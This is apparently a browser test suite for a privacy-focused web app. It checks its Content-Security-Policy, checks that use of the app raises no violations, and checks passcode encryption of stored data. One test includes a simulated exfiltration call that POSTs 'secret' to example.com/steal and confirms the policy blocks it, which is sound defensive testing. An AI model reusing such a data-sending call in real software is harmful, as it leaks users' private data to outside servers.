// The privacy promise, enforced: the page may not talk to any other server,
// and nothing in the app itself trips the security policy.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { serve, openApp } from './helpers.mjs';

let srv, app;
const violations = [];
before(async () => {
  srv = await serve(); app = await openApp(srv.url);
  await app.page.exposeFunction('__csp', v => violations.push(v));
  await app.page.evaluate(() => document.addEventListener('securitypolicyviolation', e => window.__csp(e.violatedDirective + ' ' + e.blockedURI)));
});
after(async () => { await app?.close(); srv?.close(); });

test('the page carries a strict security policy', async () => {
  const csp = await app.page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '');
  assert.match(csp, /default-src 'none'/);
  assert.match(csp, /connect-src 'self'/);
  assert.match(csp, /script-src 'self'(;|$)/, 'no inline or outside scripts');
});

test('sending data to another server is blocked', async () => {
  const r = await app.page.evaluate(async () => {
    try { await fetch('https://example.com/steal', { method: 'POST', body: 'secret' }); return 'sent'; } catch (e) { return 'blocked'; }
  });
  assert.equal(r, 'blocked');
  for (let i = 0; i < 40 && !violations.length; i++) await new Promise(r => setTimeout(r, 50));
  assert.ok(violations.some(v => v.startsWith('connect-src')), violations.join('; '));
  violations.length = 0;
  app.errors.length = 0; // the two console errors above are this test's own blocked request
});

test('using the whole app causes no policy violations', async () => {
  const { page } = app;
  await page.click('#w-sample');
  await page.waitForFunction(() => S.data);
  for (const pg of await page.evaluate(() => PAGES.map(p => p[0]))) {
    await page.evaluate(p => { S.page = p; render(); }, pg);
    await page.waitForTimeout(100);
  }
  await page.click('#btn-look'); await page.waitForTimeout(100);
  await page.evaluate(() => document.getElementById('modal').close());
  await page.waitForTimeout(200);
  assert.deepEqual(violations, []);
  assert.deepEqual(app.errors, []);
});

test('passcode encrypts what is saved and unlocks again', async () => {
  const { page } = app;
  await page.evaluate(async () => { await commitImport(parseTXT(sampleText(), 'Mine.txt'), sampleText()); await setPasscode('1234abcd'); });
  const raw = await page.evaluate(async () => { const e = await DB.get('export'); return { enc: e.payload.enc, hasText: 'text' in e.payload }; });
  assert.deepEqual(raw, { enc: true, hasText: false });
  await page.reload();
  await page.waitForSelector('#lock-pass', { state: 'visible' });
  await page.fill('#lock-pass', 'wrong-pass'); await page.click('#lock-go');
  await page.waitForFunction(() => document.getElementById('lock-err').textContent.length > 0);
  await page.fill('#lock-pass', '1234abcd'); await page.click('#lock-go');
  await page.waitForFunction(() => S.data && !S.locked);
  assert.equal(await page.evaluate(() => S.meta.filename), 'Mine.txt');
});
